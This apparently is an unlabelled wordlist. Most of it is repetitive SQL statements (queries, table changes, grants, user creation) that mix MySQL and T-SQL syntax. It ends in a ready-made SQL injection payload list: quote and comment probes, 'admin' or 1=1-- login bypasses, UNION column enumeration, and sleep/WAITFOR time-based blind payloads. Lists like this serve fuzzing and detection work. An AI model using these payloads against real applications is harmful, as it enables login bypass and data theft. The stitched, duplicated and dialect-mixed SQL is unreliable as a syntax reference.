SELECT * FROM Customers WHERE Country = 'Canada' ORDER BY CustomerName;
SELECT * FROM Employees WHERE DepartmentID IN (1, 2, 3);
SELECT * FROM Orders WHERE OrderDate = CURDATE();
SELECT * FROM Products WHERE Price < 50;
SELECT * FROM Customers WHERE City = 'Los Angeles';
SELECT * FROM Employees WHERE JobTitle = 'Manager';
SELECT * FROM Orders WHERE OrderAmount >= 500;
SELECT * FROM Products WHERE CategoryID = (SELECT CategoryID FROM Categories WHERE CategoryName = 'Electronics');
SELECT * FROM Customers WHERE CustomerID IN (SELECT CustomerID FROM Orders WHERE OrderAmount > 1000);
SELECT * FROM Employees WHERE DepartmentID = (SELECT DepartmentID FROM Departments WHERE DepartmentName = 'HR');
SELECT * FROM Orders WHERE OrderID NOT IN (SELECT OrderID FROM Shipments);
SELECT * FROM Products WHERE SupplierID = (SELECT SupplierID FROM Suppliers WHERE SupplierName = 'Acme Corp');
SELECT * FROM Customers WHERE Country = 'USA' AND City = 'Chicago';
SELECT * FROM Employees WHERE HireDate > '2022-01-01';
SELECT * FROM Orders WHERE OrderDate < '2022-01-01';
CREATE TABLE Organizations (OrganizationID INT PRIMARY KEY AUTO_INCREMENT, OrganizationName VARCHAR(50), OwnerID INT);
ALTER TABLE Repositories DROP COLUMN License;
DROP TABLE OldData;
GRANT SELECT, UPDATE ON Issues TO user3;
REVOKE INSERT ON PullRequests FROM user4;
CREATE USER 'backup_user' IDENTIFIED BY 'backup_password';
ALTER USER 'guest' RENAME TO 'visitor';
BEGIN TRANSACTION; INSERT INTO Stars (RepositoryID, UserID) VALUES (789, 456); COMMIT;
CREATE INDEX idx_issue_title ON Issues(Title);
BACKUP DATABASE GitHubDB TO 'github_backup.sql';
INSERT INTO Repositories (RepositoryID, RepositoryName, Language) VALUES (101, 'NewRepo', 'Python');
UPDATE Contributors SET Contributions = Contributions + 1 WHERE ContributorID = 123;
DELETE FROM Issues WHERE IssueID = 456;
CREATE VIEW ActiveUsers AS SELECT UserID, UserName FROM Users WHERE Active = 1;
RENAME TABLE OldTable TO NewTable;
TRUNCATE TABLE TempData;
LOCK TABLES Orders WRITE;
UNLOCK TABLES;
SET @total_sales = (SELECT SUM(Amount) FROM Sales);
CALL UpdateStatistics();
DECLARE @average_price DECIMAL(10, 2);
SET @average_price = (SELECT AVG(Price) FROM Products);
IF @average_price > 100 THEN UPDATE Products SET Discount = 0.1 WHERE Price > 100; END IF;
SELECT * FROM Users;
SELECT UserID, UserName FROM Users WHERE Active = 1;
SELECT COUNT(*) FROM Orders;
SELECT MAX(Price) FROM Products;
SELECT MIN(Price) FROM Products;
SELECT AVG(Price) FROM Products;
SELECT SUM(Quantity) FROM Sales;
SELECT DISTINCT Country FROM Customers;
SELECT NOW();
SELECT CURDATE();
SELECT UserID, UserName FROM Users ORDER BY UserName;
SELECT * FROM Orders WHERE OrderDate > '2023-01-01';
SELECT * FROM Products WHERE Price BETWEEN 10 AND 20;
SELECT * FROM Customers WHERE Country IN ('USA', 'Canada');
SELECT * FROM Employees WHERE LastName LIKE 'S%';
SELECT * FROM Orders WHERE OrderID IS NULL;
SELECT * FROM Products WHERE Price IS NOT NULL;
SELECT * FROM Customers WHERE Country = 'USA' AND City = 'New York';
SELECT * FROM Employees WHERE Department = 'Sales' OR Department = 'Marketing';
SELECT * FROM Orders WHERE OrderDate >= '2023-01-01' AND OrderDate <= '2023-12-31';
SELECT * FROM Products WHERE Price > 100 ORDER BY Price DESC;
SELECT * FROM Customers WHERE Country = 'USA' ORDER BY City;
SELECT * FROM Employees WHERE HireDate < '2020-01-01';
SELECT * FROM Orders WHERE CustomerID = 123;
SELECT * FROM Products WHERE CategoryID = 5;
SELECT * FROM Employees WHERE ManagerID IS NULL;
SELECT * FROM Orders WHERE ShippedDate IS NOT NULL;
SELECT * FROM Products WHERE Stock > 0;
SELECT * FROM Customers WHERE Email LIKE '%@gmail.com';
SELECT * FROM Employees WHERE Salary > 50000;
SELECT * FROM Orders WHERE OrderAmount > 1000;
SELECT * FROM Products WHERE ProductName LIKE '%Laptop%';
SELECT * FROM Customers WHERE Phone IS NOT NULL;
SELECT * FROM Employees WHERE BirthDate BETWEEN '1980-01-01' AND '1990-12-31';
SELECT * FROM Orders WHERE Status = 'Pending';
SELECT * FROM Products WHERE Discontinued = 0;
SELECT * FROM Customers WHERE Country = 'Canada' ORDER BY CustomerName;
SELECT * FROM Employees WHERE DepartmentID IN (1, 2, 3);
SELECT * FROM Orders WHERE OrderDate = CURDATE();
SELECT * FROM Products WHERE Price < 50;
SELECT * FROM Customers WHERE City = 'Los Angeles';
SELECT * FROM Employees WHERE JobTitle = 'Manager';
SELECT * FROM Orders WHERE OrderAmount >= 500;
SELECT * FROM Products WHERE CategoryID = (SELECT CategoryID FROM Categories WHERE CategoryName = 'Electronics');
SELECT * FROM Customers WHERE CustomerID IN (SELECT CustomerID FROM Orders WHERE OrderAmount > 1000);
SELECT * FROM Employees WHERE DepartmentID = (SELECT DepartmentID FROM Departments WHERE DepartmentName = 'HR');
SELECT * FROM Orders WHERE OrderID NOT IN (SELECT OrderID FROM Shipments);
SELECT * FROM Products WHERE SupplierID = (SELECT SupplierID FROM Suppliers WHERE SupplierName = 'Acme Corp');
SELECT * FROM Customers WHERE Country = 'USA' AND City = 'Chicago';
SELECT * FROM Employees WHERE HireDate > '2022-01-01';
SELECT * FROM Orders WHERE OrderDate < '2022-01-01';
INSERT INTO Repositories (RepositoryID, RepositoryName, Language) VALUES (101, 'NewRepo', 'Python');
UPDATE Contributors SET Contributions = Contributions + 1 WHERE ContributorID = 123;
DELETE FROM Issues WHERE IssueID = 456;
TRUNCATE TABLE TempData;
CREATE TABLE Organizations (OrganizationID INT PRIMARY KEY AUTO_INCREMENT, OrganizationName VARCHAR(50), OwnerID INT);
ALTER TABLE Repositories DROP COLUMN License;
DROP TABLE OldData;
CREATE VIEW ActiveUsers AS SELECT UserID, UserName FROM Users WHERE Active = 1;
RENAME TABLE OldTable TO NewTable;
CREATE INDEX idx_issue_title ON Issues(Title);
GRANT SELECT, UPDATE ON Issues TO user3;
REVOKE INSERT ON PullRequests FROM user4;
CREATE USER 'backup_user' IDENTIFIED BY 'backup_password';
ALTER USER 'guest' RENAME TO 'visitor';
BEGIN TRANSACTION; INSERT INTO Stars (RepositoryID, UserID) VALUES (789, 456); COMMIT;
LOCK TABLES Orders WRITE;
UNLOCK TABLES;
SELECT Orders.OrderID, Customers.CustomerName FROM Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;
SELECT Employees.EmployeeName, Departments.DepartmentName FROM Employees LEFT JOIN Departments ON Employees.DepartmentID = Departments.DepartmentID;
SELECT Products.ProductName, Suppliers.SupplierName FROM Products RIGHT JOIN Suppliers ON Products.SupplierID = Suppliers.SupplierID;
SELECT Orders.OrderID, Customers.CustomerName FROM Orders FULL OUTER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;
SELECT ProductName FROM Products WHERE CategoryID = (SELECT CategoryID FROM Categories WHERE CategoryName = 'Electronics');
SELECT CustomerName FROM Customers WHERE CustomerID IN (SELECT CustomerID FROM Orders WHERE OrderAmount > 1000);
SELECT COUNT(*) FROM Orders;
SELECT AVG(Price) FROM Products;
SELECT SUM(Quantity) FROM Sales;
SELECT MAX(Price) FROM Products;
SELECT MIN(Price) FROM Products;
SELECT Country, COUNT(*) FROM Customers GROUP BY Country;
SELECT DepartmentID, AVG(Salary) FROM Employees GROUP BY DepartmentID HAVING AVG(Salary) > 50000;
SELECT UserID, UserName FROM Users WHERE Active = 1 UNION SELECT UserID, UserName FROM ArchivedUsers WHERE Active = 1;
SELECT ProductName, CASE WHEN Price > 100 THEN 'Expensive' ELSE 'Affordable' END AS PriceCategory FROM Products;
CREATE TABLE Projects (ProjectID INT PRIMARY KEY, ProjectName VARCHAR(100), StartDate DATE, EndDate DATE);
INSERT INTO Projects (ProjectID, ProjectName, StartDate, EndDate) VALUES (1, 'Project Alpha', '2023-01-01', '2023-12-31');
UPDATE Projects SET EndDate = '2024-12-31' WHERE ProjectID = 1;
DELETE FROM Projects WHERE ProjectID = 1;
CREATE INDEX idx_project_name ON Projects(ProjectName);
DROP TABLE Projects;
ALTER TABLE Projects ADD COLUMN Budget DECIMAL(10, 2);
ALTER TABLE Projects DROP COLUMN Budget;
CREATE VIEW ActiveProjects AS SELECT ProjectID, ProjectName FROM Projects WHERE EndDate > CURDATE();
RENAME TABLE Projects TO ProjectDetails;
TRUNCATE TABLE Projects;
GRANT SELECT, INSERT, UPDATE ON Projects TO user1;
REVOKE DELETE ON Projects FROM user1;
CREATE USER 'project_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'project_manager' RENAME TO 'pm_user';
BEGIN TRANSACTION; INSERT INTO Projects (ProjectID, ProjectName, StartDate, EndDate) VALUES (2, 'Project Beta', '2023-06-01', '2023-12-31'); COMMIT;
LOCK TABLES Projects WRITE;
UNLOCK TABLES;
BACKUP DATABASE ProjectDB TO 'project_backup.sql';
CALL UpdateProjectStatus();
SET @total_budget = (SELECT SUM(Budget) FROM Projects);
DECLARE @average_duration INT;
SET @average_duration = (SELECT AVG(DATEDIFF(EndDate, StartDate)) FROM Projects);
IF @average_duration > 365 THEN UPDATE Projects SET Status = 'Long-term' WHERE DATEDIFF(EndDate, StartDate) > 365; END IF;
INSERT INTO Customers (CustomerID, CustomerName, ContactName, Country) VALUES (1, 'Alfreds Futterkiste', 'Maria Anders', 'Germany');
UPDATE Customers SET ContactName = 'Alfred Schmidt', City = 'Frankfurt' WHERE CustomerID = 1;
DELETE FROM Customers WHERE CustomerID = 1;
CREATE TABLE Orders (OrderID INT PRIMARY KEY, OrderNumber INT, CustomerID INT);
ALTER TABLE Orders ADD COLUMN OrderDate DATE;
DROP TABLE Orders;
CREATE VIEW CustomerOrders AS SELECT Customers.CustomerName, Orders.OrderNumber FROM Customers JOIN Orders ON Customers.CustomerID = Orders.CustomerID;
RENAME TABLE Orders TO OrderDetails;
TRUNCATE TABLE Orders;
GRANT SELECT, INSERT, UPDATE ON Orders TO user2;
REVOKE DELETE ON Orders FROM user2;
CREATE USER 'order_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'order_manager' RENAME TO 'om_user';
BEGIN TRANSACTION; INSERT INTO Orders (OrderID, OrderNumber, CustomerID) VALUES (1, 12345, 1); COMMIT;
LOCK TABLES Orders WRITE;
UNLOCK TABLES;
BACKUP DATABASE OrderDB TO 'order_backup.sql';
CALL UpdateOrderStatus();
SET @total_orders = (SELECT COUNT(*) FROM Orders);
DECLARE @average_order_value DECIMAL(10, 2);
SET @average_order_value = (SELECT AVG(OrderValue) FROM Orders);
IF @average_order_value > 1000 THEN UPDATE Orders SET Priority = 'High' WHERE OrderValue > 1000; END IF;
CREATE TABLE Products (ProductID INT PRIMARY KEY, ProductName VARCHAR(100), SupplierID INT, CategoryID INT, UnitPrice DECIMAL(10, 2), UnitsInStock INT);
INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (1, 'Chai', 1, 1, 18.00, 39);
UPDATE Products SET UnitPrice = 19.00 WHERE ProductID = 1;
DELETE FROM Products WHERE ProductID = 1;
CREATE INDEX idx_product_name ON Products(ProductName);
DROP TABLE Products;
ALTER TABLE Products ADD COLUMN Discontinued BIT;
ALTER TABLE Products DROP COLUMN Discontinued;
CREATE VIEW ActiveProducts AS SELECT ProductID, ProductName FROM Products WHERE Discontinued = 0;
RENAME TABLE Products TO ProductDetails;
TRUNCATE TABLE Products;
GRANT SELECT, INSERT, UPDATE ON Products TO user3;
REVOKE DELETE ON Products FROM user3;
CREATE USER 'product_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'product_manager' RENAME TO 'pm_user';
BEGIN TRANSACTION; INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (2, 'Chang', 1, 1, 19.00, 17); COMMIT;
LOCK TABLES Products WRITE;
UNLOCK TABLES;
BACKUP DATABASE ProductDB TO 'product_backup.sql';
CALL UpdateProductStatus();
SET @total_stock = (SELECT SUM(UnitsInStock) FROM Products);
DECLARE @average_price DECIMAL(10, 2);
SET @average_price = (SELECT AVG(UnitPrice) FROM Products);
IF @average_price > 20 THEN UPDATE Products SET Discount = 0.1 WHERE UnitPrice > 20; END IF;
CREATE TABLE Suppliers (SupplierID INT PRIMARY KEY, SupplierName VARCHAR(100), ContactName VARCHAR(100), Country VARCHAR(50));
INSERT INTO Suppliers (SupplierID, SupplierName, ContactName, Country) VALUES (1, 'Exotic Liquids', 'Charlotte Cooper', 'UK');
UPDATE Suppliers SET ContactName = 'Charlotte Brown' WHERE SupplierID = 1;
DELETE FROM Suppliers WHERE SupplierID = 1;
CREATE INDEX idx_supplier_name ON Suppliers(SupplierName);
DROP TABLE Suppliers;
ALTER TABLE Suppliers ADD COLUMN Phone VARCHAR(20);
ALTER TABLE Suppliers DROP COLUMN Phone;
CREATE VIEW ActiveSuppliers AS SELECT SupplierID, SupplierName FROM Suppliers WHERE Country = 'UK';
RENAME TABLE Suppliers TO SupplierDetails;
TRUNCATE TABLE Suppliers;
GRANT SELECT, INSERT, UPDATE ON Suppliers TO user4;
REVOKE DELETE ON Suppliers FROM user4;
CREATE USER 'supplier_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'supplier_manager' RENAME TO 'sm_user';
BEGIN TRANSACTION; INSERT INTO Suppliers (SupplierID, SupplierName, ContactName, Country) VALUES (2, 'New Orleans Cajun Delights', 'Shelley Burke', 'USA'); COMMIT;
LOCK TABLES Suppliers WRITE;
UNLOCK TABLES;
BACKUP DATABASE SupplierDB TO 'supplier_backup.sql';
CALL UpdateSupplierStatus();
SET @total_suppliers = (SELECT COUNT(*) FROM Suppliers);
DECLARE @average_supplier_rating DECIMAL(10, 2);
SET @average_supplier_rating = (SELECT AVG(Rating) FROM SupplierRatings);
IF @average_supplier_rating > 4 THEN UPDATE Suppliers SET Preferred = 1 WHERE Rating > 4; END IF;
CREATE TABLE Categories (CategoryID INT PRIMARY KEY, CategoryName VARCHAR(100), Description TEXT);
INSERT INTO Categories (CategoryID, CategoryName, Description) VALUES (1, 'Beverages', 'Soft drinks, coffees, teas, beers, and ales');
UPDATE Categories SET Description = 'Soft drinks, coffees, teas, beers, ales, and more' WHERE CategoryID = 1;
DELETE FROM Categories WHERE CategoryID = 1;
CREATE INDEX idx_category_name ON Categories(CategoryName);
DROP TABLE Categories;
ALTER TABLE Categories ADD COLUMN Picture BLOB;
ALTER TABLE Categories DROP COLUMN Picture;
CREATE VIEW ActiveCategories AS SELECT CategoryID, CategoryName FROM Categories WHERE CategoryName LIKE 'B%';
RENAME TABLE Categories TO CategoryDetails;
TRUNCATE TABLE Categories;
GRANT SELECT, INSERT, UPDATE ON Categories TO user5;
REVOKE DELETE ON Categories FROM user5;
CREATE USER 'category_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'category_manager' RENAME TO 'cm_user';
BEGIN TRANSACTION; INSERT INTO Categories (CategoryID, CategoryName, Description) VALUES (2, 'Condiments', 'Sweet and savory sauces, relishes, spreads, and seasonings'); COMMIT;
LOCK TABLES Categories WRITE;
UNLOCK TABLES;
BACKUP DATABASE CategoryDB TO 'category_backup.sql';
CALL UpdateCategoryStatus();
SET @total_categories = (SELECT COUNT(*) FROM Categories);
DECLARE @average_category_size INT;
SET @average_category_size = (SELECT AVG(LENGTH(Description)) FROM Categories);
IF @average_category_size > 100 THEN UPDATE Categories SET Popular = 1 WHERE LENGTH(Description) > 100; END IF;
CREATE TABLE Employees (EmployeeID INT PRIMARY KEY, FirstName VARCHAR(50), LastName VARCHAR(50), BirthDate DATE, HireDate DATE);
INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, HireDate) VALUES (1, 'John', 'Doe', '1980-01-01', '2020-01-01');
UPDATE Employees SET LastName = 'Smith' WHERE EmployeeID = 1;
DELETE FROM Employees WHERE EmployeeID = 1;
CREATE INDEX idx_employee_name ON Employees(LastName);
DROP TABLE Employees;
ALTER TABLE Employees ADD COLUMN Salary DECIMAL(10, 2);
ALTER TABLE Employees DROP COLUMN Salary;
CREATE VIEW ActiveEmployees AS SELECT EmployeeID, FirstName, LastName FROM Employees WHERE HireDate > '2020-01-01';
RENAME TABLE Employees TO EmployeeDetails;
TRUNCATE TABLE Employees;
GRANT SELECT, INSERT, UPDATE ON Employees TO user6;
REVOKE DELETE ON Employees FROM user6;
CREATE USER 'employee_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'employee_manager' RENAME TO 'em_user';
BEGIN TRANSACTION; INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, HireDate) VALUES (2, 'Jane', 'Doe', '1990-01-01', '2021-01-01'); COMMIT;
LOCK TABLES Employees WRITE;
UNLOCK TABLES;
BACKUP DATABASE EmployeeDB TO 'employee_backup.sql';
CALL UpdateEmployeeStatus();
SET @total_employees = (SELECT COUNT(*) FROM Employees);
DECLARE @average_salary DECIMAL(10, 2);
SET @average_salary = (SELECT AVG(Salary) FROM Employees);
IF @average_salary > 50000 THEN UPDATE Employees SET Bonus = 5000 WHERE Salary > 50000; END IF;
CREATE TABLE Departments (DepartmentID INT PRIMARY KEY, DepartmentName VARCHAR(100), ManagerID INT);
INSERT INTO Departments (DepartmentID, DepartmentName, ManagerID) VALUES (1, 'HR', 1);
UPDATE Departments SET DepartmentName = 'Human Resources' WHERE DepartmentID = 1;
DELETE FROM Departments WHERE DepartmentID = 1;
CREATE INDEX idx_department_name ON Departments(DepartmentName);
DROP TABLE Departments;
ALTER TABLE Departments ADD COLUMN Location VARCHAR(100);
ALTER TABLE Departments DROP COLUMN Location;
CREATE VIEW ActiveDepartments AS SELECT DepartmentID, DepartmentName FROM Departments WHERE ManagerID IS NOT NULL;
RENAME TABLE Departments TO DepartmentDetails;
TRUNCATE TABLE Departments;
GRANT SELECT, INSERT, UPDATE ON Departments TO user7;
REVOKE DELETE ON Departments FROM user7;
CREATE USER 'department_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'department_manager' RENAME TO 'dm_user';
BEGIN TRANSACTION; INSERT INTO Departments (DepartmentID, DepartmentName, ManagerID) VALUES (2, 'IT', 2); COMMIT;
LOCK TABLES Departments WRITE;
UNLOCK TABLES;
BACKUP DATABASE DepartmentDB TO 'department_backup.sql';
CALL UpdateDepartmentStatus();
SET @total_departments = (SELECT COUNT(*) FROM Departments);
DECLARE @average_department_size INT;
SET @average_department_size = (SELECT AVG(EmployeeCount) FROM DepartmentStats);
IF @average_department_size > 50 THEN UPDATE Departments SET Large = 1 WHERE EmployeeCount > 50; END IF;
CREATE TABLE Sales (SaleID INT PRIMARY KEY, ProductID INT, Quantity INT, SaleDate DATE);
INSERT INTO Sales (SaleID, ProductID, Quantity, SaleDate) VALUES (1, 1, 10, '2023-01-01');
UPDATE Sales SET Quantity = 15 WHERE SaleID = 1;
DELETE FROM Sales WHERE SaleID = 1;
CREATE INDEX idx_sale_date ON Sales(SaleDate);
DROP TABLE Sales;
ALTER TABLE Sales ADD COLUMN Discount DECIMAL(5, 2);
ALTER TABLE Sales DROP COLUMN Discount;
CREATE VIEW RecentSales AS SELECT SaleID, ProductID, Quantity FROM Sales WHERE SaleDate > '2023-01-01';
RENAME TABLE Sales TO SaleDetails;
TRUNCATE TABLE Sales;
GRANT SELECT, INSERT, UPDATE ON Sales TO user8;
REVOKE DELETE ON Sales FROM user8;
CREATE USER 'sales_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'sales_manager' RENAME TO 'sm_user';
BEGIN TRANSACTION; INSERT INTO Sales (SaleID, ProductID, Quantity, SaleDate) VALUES (2, 2, 20, '2023-02-01'); COMMIT;
LOCK TABLES Sales WRITE;
UNLOCK TABLES;
BACKUP DATABASE SalesDB TO 'sales_backup.sql';
CALL UpdateSalesStatus();
SET @total_sales = (SELECT COUNT(*) FROM Sales);
DECLARE @average_sale_value DECIMAL(10, 2);
SET @average_sale_value = (SELECT AVG(TotalValue) FROM Sales);
IF @average_sale_value > 1000 THEN UPDATE Sales SET HighValue = 1 WHERE TotalValue > 1000; END IF;
CREATE TABLE Inventory (InventoryID INT PRIMARY KEY, ProductID INT, Quantity INT, LastUpdated DATE);
INSERT INTO Inventory (InventoryID, ProductID, Quantity, LastUpdated) VALUES (1, 1, 100, '2023-01-01');
UPDATE Inventory SET Quantity = 150 WHERE InventoryID = 1;
DELETE FROM Inventory WHERE InventoryID = 1;
CREATE INDEX idx_inventory_product ON Inventory(ProductID);
DROP TABLE Inventory;
ALTER TABLE Inventory ADD COLUMN Location VARCHAR(100);
ALTER TABLE Inventory DROP COLUMN Location;
CREATE VIEW CurrentInventory AS SELECT InventoryID, ProductID, Quantity FROM Inventory WHERE Quantity > 0;
RENAME TABLE Inventory TO InventoryDetails;
TRUNCATE TABLE Inventory;
GRANT SELECT, INSERT, UPDATE ON Inventory TO user9;
REVOKE DELETE ON Inventory FROM user9;
CREATE USER 'inventory_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'inventory_manager' RENAME TO 'im_user';
BEGIN TRANSACTION; INSERT INTO Inventory (InventoryID, ProductID, Quantity, LastUpdated) VALUES (2, 2, 200, '2023-02-01'); COMMIT;
LOCK TABLES Inventory WRITE;
UNLOCK TABLES;
BACKUP DATABASE InventoryDB TO 'inventory_backup.sql';
CALL UpdateInventoryStatus();
SET @total_inventory = (SELECT COUNT(*) FROM Inventory);
DECLARE @average_inventory_level INT;
SET @average_inventory_level = (SELECT AVG(Quantity) FROM Inventory);
IF @average_inventory_level > 100 THEN UPDATE Inventory SET Overstocked = 1 WHERE Quantity > 100; END IF;
CREATE TABLE Orders (OrderID INT PRIMARY KEY, CustomerID INT, OrderDate DATE, Status VARCHAR(50));
INSERT INTO Orders (OrderID, CustomerID, OrderDate, Status) VALUES (1, 1, '2023-01-01', 'Pending');
UPDATE Orders SET Status = 'Shipped' WHERE OrderID = 1;
DELETE FROM Orders WHERE OrderID = 1;
CREATE INDEX idx_order_date ON Orders(OrderDate);
DROP TABLE Orders;
ALTER TABLE Orders ADD COLUMN ShippingDate DATE;
ALTER TABLE Orders DROP COLUMN ShippingDate;
CREATE VIEW PendingOrders AS SELECT OrderID, CustomerID, OrderDate FROM Orders WHERE Status = 'Pending';
RENAME TABLE Orders TO OrderDetails;
TRUNCATE TABLE Orders;
GRANT SELECT, INSERT, UPDATE ON Orders TO user10;
REVOKE DELETE ON Orders FROM user10;
CREATE USER 'order_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'order_manager' RENAME TO 'om_user';
BEGIN TRANSACTION; INSERT INTO Orders (OrderID, CustomerID, OrderDate, Status) VALUES (2, 2, '2023-02-01', 'Pending'); COMMIT;
LOCK TABLES Orders WRITE;
UNLOCK TABLES;
BACKUP DATABASE OrderDB TO 'order_backup.sql';
CALL UpdateOrderStatus();
SET @total_orders = (SELECT COUNT(*) FROM Orders);
DECLARE @average_order_value DECIMAL(10, 2);
SET @average_order_value = (SELECT AVG(TotalValue) FROM Orders);
IF @average_order_value > 500 THEN UPDATE Orders SET Priority = 'High' WHERE TotalValue > 500; END IF;
CREATE TABLE Payments (PaymentID INT PRIMARY KEY, OrderID INT, Amount DECIMAL(10, 2), PaymentDate DATE);
INSERT INTO Payments (PaymentID, OrderID, Amount, PaymentDate) VALUES (1, 1, 100.00, '2023-01-01');
UPDATE Payments SET Amount = 150.00 WHERE PaymentID = 1;
DELETE FROM Payments WHERE PaymentID = 1;
CREATE INDEX idx_payment_date ON Payments(PaymentDate);
DROP TABLE Payments;
ALTER TABLE Payments ADD COLUMN PaymentMethod VARCHAR(50);
ALTER TABLE Payments DROP COLUMN PaymentMethod;
CREATE VIEW RecentPayments AS SELECT PaymentID, OrderID, Amount FROM Payments WHERE PaymentDate > '2023-01-01';
RENAME TABLE Payments TO PaymentDetails;
TRUNCATE TABLE Payments;
GRANT SELECT, INSERT, UPDATE ON Payments TO user11;
REVOKE DELETE ON Payments FROM user11;
CREATE USER 'payment_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'payment_manager' RENAME TO 'pm_user';
BEGIN TRANSACTION; INSERT INTO Payments (PaymentID, OrderID, Amount, PaymentDate) VALUES (2, 2, 200.00, '2023-02-01'); COMMIT;
LOCK TABLES Payments WRITE;
UNLOCK TABLES;
BACKUP DATABASE PaymentDB TO 'payment_backup.sql';
CALL UpdatePaymentStatus();
SET @total_payments = (SELECT COUNT(*) FROM Payments);
DECLARE @average_payment_amount DECIMAL(10, 2);
SET @average_payment_amount = (SELECT AVG(Amount) FROM Payments);
IF @average_payment_amount > 100 THEN UPDATE Payments SET HighValue = 1 WHERE Amount > 100; END IF;
CREATE TABLE Customers (CustomerID INT PRIMARY KEY, CustomerName VARCHAR(100), ContactName VARCHAR(100), Country VARCHAR(50));
INSERT INTO Customers (CustomerID, CustomerName, ContactName, Country) VALUES (1, 'Alfreds Futterkiste', 'Maria Anders', 'Germany');
UPDATE Customers SET ContactName = 'Maria Schmidt' WHERE CustomerID = 1;
DELETE FROM Customers WHERE CustomerID = 1;
CREATE INDEX idx_customer_name ON Customers(CustomerName);
DROP TABLE Customers;
ALTER TABLE Customers ADD COLUMN Phone VARCHAR(20);
ALTER TABLE Customers DROP COLUMN Phone;
CREATE VIEW ActiveCustomers AS SELECT CustomerID, CustomerName FROM Customers WHERE Country = 'Germany';
RENAME TABLE Customers TO CustomerDetails;
TRUNCATE TABLE Customers;
GRANT SELECT, INSERT, UPDATE ON Customers TO user12;
REVOKE DELETE ON Customers FROM user12;
CREATE USER 'customer_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'customer_manager' RENAME TO 'cm_user';
BEGIN TRANSACTION; INSERT INTO Customers (CustomerID, CustomerName, ContactName, Country) VALUES (2, 'Ana Trujillo Emparedados y helados', 'Ana Trujillo', 'Mexico'); COMMIT;
LOCK TABLES Customers WRITE;
UNLOCK TABLES;
BACKUP DATABASE CustomerDB TO 'customer_backup.sql';
CALL UpdateCustomerStatus();
SET @total_customers = (SELECT COUNT(*) FROM Customers);
DECLARE @average_customer_orders INT;
SET @average_customer_orders = (SELECT AVG(OrderCount) FROM CustomerStats);
IF @average_customer_orders > 10 THEN UPDATE Customers SET VIP = 1 WHERE OrderCount > 10; END IF;
CREATE TABLE Products (ProductID INT PRIMARY KEY, ProductName VARCHAR(100), SupplierID INT, CategoryID INT, UnitPrice DECIMAL(10, 2), UnitsInStock INT);
INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (1, 'Chai', 1, 1, 18.00, 39);
UPDATE Products SET UnitPrice = 19.00 WHERE ProductID = 1;
DELETE FROM Products WHERE ProductID = 1;
CREATE INDEX idx_product_name ON Products(ProductName);
DROP TABLE Products;
ALTER TABLE Products ADD COLUMN Discontinued BIT;
ALTER TABLE Products DROP COLUMN Discontinued;
CREATE VIEW ActiveProducts AS SELECT ProductID, ProductName FROM Products WHERE Discontinued = 0;
RENAME TABLE Products TO ProductDetails;
TRUNCATE TABLE Products;
GRANT SELECT, INSERT, UPDATE ON Products TO user13;
REVOKE DELETE ON Products FROM user13;
CREATE USER 'product_manager' IDENTIFIED BY 'securepassword';
ALTER USER 'product_manager' RENAME TO 'pm_user';
BEGIN TRANSACTION; INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (2, 'Chang', 1, 1, 19.00, 17); COMMIT;
''
``
""
//
\\
' or "
-- or #
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/
+ addition, concatenate (or space in url)
|| (double pipe) concatenate
% wildcard attribute indicator
@variable local variable
@@variable global variable
# Numeric
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
# Hash comment
/* C-style comment
-- - SQL comment
;%00 Nullbyte
` Backtick
' OR 1=1--
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' OR '1'='1'-- -
' OR '1'='1'/* 
admin'--
admin'#
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin") or 1=1
admin") or 1=1--
admin") or 1=1#
admin") or 1=1/*
admin') or 1=1
admin') or 1=1--
admin') or 1=1#
admin') or 1=1/*
admin' or 'a'='a
admin' or 'a'='a'--
admin' or 'a'='a'#
admin' or 'a'='a'/*
admin") or ("a"="a
admin") or ("a"="a"--
admin") or ("a"="a"#
admin") or ("a"="a"/*
admin') or ('a'='a
admin') or ('a'='a'--
admin') or ('a'='a'#
admin') or ('a'='a'/*
' or 1=1
' or 1=1--
' or 1=1#
